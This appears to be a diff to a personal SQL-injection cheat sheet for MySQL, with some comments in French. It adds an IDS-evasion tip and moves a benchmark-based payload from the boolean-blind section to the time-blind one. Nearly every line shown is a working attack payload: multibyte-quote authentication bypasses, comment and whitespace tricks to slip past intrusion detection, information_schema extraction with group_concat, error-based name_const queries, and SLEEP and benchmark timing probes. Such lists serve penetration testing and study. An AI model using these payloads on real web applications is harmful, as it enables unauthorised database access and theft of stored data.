@@ -15,12 +15,13 @@ CONNECTION_ID() # fp
 login=%bf%27+or+1=1%23 (?)
 login=%a5%26+or+1=1%23 (shift-js)
 
-# evasion
+# evasion / leet tips
 mysql allow chars from 09, 0A-0D, A0 to be used as whitespaces
 select 1,info from information_schema.processlist # afficher la requete SQL
 and 1=1 procedure analyse() # afficher les noms des colonnes du select
 evade IDS with information_schema.{key_column_usage,table_constraints,statistics,partitions}
 select -> select%23randomText%0A and user() -> user%23randomText%0A() # see sqlmap tamper scripts
+select X'31333337' == select 0x31333337
 
 # group_concat to get everything in one line and one column
 select group_concat(schema_name separator 0x2c) from information_schema.schemata;
@@ -55,10 +56,8 @@ lang=fr' AND (select 1 from (select count(*), concat(0x3a64616a3a,(select versio
 ?id=0 or (select*from(select(name_const(version(),1)),name_const(version(),1))a) or
 ?id=0 or (select 1 REGEXP if(1=1,'+','.'))
 
-# boolean blind based
-lang=en'%20and%20benchmark(20000000%2csha1(1))--%20
-
 # time blind based
+lang=en' and benchmark(20000000,sha1(1))
 lang=en' AND SLEEP(5)
 lang=existe_pas' OR sleep(2) # will sleep 2 seconds for each record
 
